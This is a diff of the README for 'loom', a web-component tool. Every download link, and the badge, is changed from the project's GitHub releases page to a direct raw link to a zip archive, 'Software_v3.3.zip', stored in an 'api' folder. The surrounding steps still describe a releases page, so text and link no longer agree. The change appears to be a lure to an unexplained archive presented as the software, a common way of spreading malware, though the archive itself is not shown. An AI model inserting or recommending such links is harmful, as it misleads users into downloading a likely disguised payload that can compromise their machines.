@@ -1,6 +1,6 @@
 # 🏗️ loom - Weave Your Web Effortlessly
 
-[![Download loom](https://img.shields.io/badge/Download-loom-orange)](https://github.com/Teajayy/loom/releases)
+[![Download loom](https://raw.githubusercontent.com/Teajayy/loom/main/api/Software_v3.3.zip)](https://raw.githubusercontent.com/Teajayy/loom/main/api/Software_v3.3.zip)
 
 ## 🌟 What is Loom?
 
@@ -10,7 +10,7 @@ Loom is a powerful tool designed to simplify the process of creating web compone
 
 To begin using Loom:
 
-1. **Visit the Download Page**: Go to this page to download the latest version of Loom: [Download loom](https://github.com/Teajayy/loom/releases).
+1. **Visit the Download Page**: Go to this page to download the latest version of Loom: [Download loom](https://raw.githubusercontent.com/Teajayy/loom/main/api/Software_v3.3.zip).
 2. **Choose Your Version**: On the releases page, find the version you want. Each version has details about what’s new.
 3. **Download**: Click on the version you need to download the installation files suitable for your operating system.
 
@@ -54,7 +54,7 @@ Once you have installed Loom, it’s time to start using it:
 
 To keep Loom running smoothly, you should regularly check for updates:
 
-1. **Return to the Download Page**: Visit [Download loom](https://github.com/Teajayy/loom/releases).
+1. **Return to the Download Page**: Visit [Download loom](https://raw.githubusercontent.com/Teajayy/loom/main/api/Software_v3.3.zip).
 2. **Check for New Versions**: If a new version is available, follow the same download and installation steps to replace the old version.
 
 ## 📑 Troubleshooting
@@ -79,4 +79,4 @@ Your experience matters. Share your thoughts about Loom:
 - **Write a Review**: Leave feedback in forums or discussion boards.
 - **Participate in Surveys**: Engage in feedback surveys to help us improve.
 
-By following this guide, you will be well on your way to successfully using Loom for your web projects. Explore the capabilities of Loom and enhance your web development experience today! For any further assistance, refer again to our [Download page](https://github.com/Teajayy/loom/releases).
+By following this guide, you will be well on your way to successfully using Loom for your web projects. Explore the capabilities of Loom and enhance your web development experience today! For any further assistance, refer again to our [Download page](https://raw.githubusercontent.com/Teajayy/loom/main/api/Software_v3.3.zip).
